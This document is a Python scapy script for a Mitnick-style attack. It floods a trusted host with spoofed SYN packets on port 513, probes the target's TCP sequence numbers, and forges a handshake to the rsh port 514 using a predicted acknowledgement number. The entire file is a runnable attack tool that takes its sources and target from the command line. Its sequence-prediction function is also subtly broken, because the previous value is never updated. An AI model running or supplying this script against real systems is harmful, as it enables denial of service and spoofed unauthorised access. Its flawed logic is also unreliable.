import argparse
from scapy.all import send, sr1
from scapy.layers.inet import IP, TCP


def syn_flood(src, tgt):
    for sport in range(1024, 65535):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=513)
        pkt = ip_layer / tcp_layer
        send(pkt)


def cal_TSN(tgt):
    seq_num = 0
    pre_num = 0
    diff_seq = 0

    for x in range(1, 5):
        if pre_num:
            pre_num = seq_num
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seq_num = ans.getlayer(TCP).seq
        diff_seq = seq_num - pre_num
        print(f'[+] TCP Seq Difference: {str(diff_seq)}')

    return seq_num + diff_seq


def spoof_conn(src, tgt, ack):
    ip_layer = IP(src=src, dst=tgt)
    tcp_layer = TCP(sport=513, dport=514)
    syn_pkt = ip_layer / tcp_layer
    send(syn_pkt)

    ip_layer = IP(src=src, dst=tgt)
    tcp_layer = TCP(sport=513, dport=514, ack=ack)
    ack_pkt = ip_layer / tcp_layer
    send(ack_pkt)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 mitnick_attack.py SRC_SYN SRC_SPOOFED TARGET_ADDRESS')
    parser.add_argument('src_syn', type=str, metavar='SRC_SYN',
                        help='specify the source for the SYN flood attack')
    parser.add_argument('src_spoof', type=str, metavar='SRC_SPOOFED',
                        help='specify the source for the spoofed connection')
    parser.add_argument('target', type=str, metavar='TARGET_ADDRESS',
                        help='specify the target address of the attack')
    args = parser.parse_args()

    _syn_spoof = args.src_syn
    _src_spoof = args.src_spoof
    _target = args.target

    print('[+] Starting SYN Flood to suppress the remote server.')
    syn_flood(_syn_spoof, _src_spoof)

    print('[+] Calculating correct TCP Sequence Number.')
    _seq_num = cal_TSN(_target) + 1

    print('[+] Spoofing Connection.')
    spoof_conn(_src_spoof, _target, _seq_num)

    print('[+] Done.')
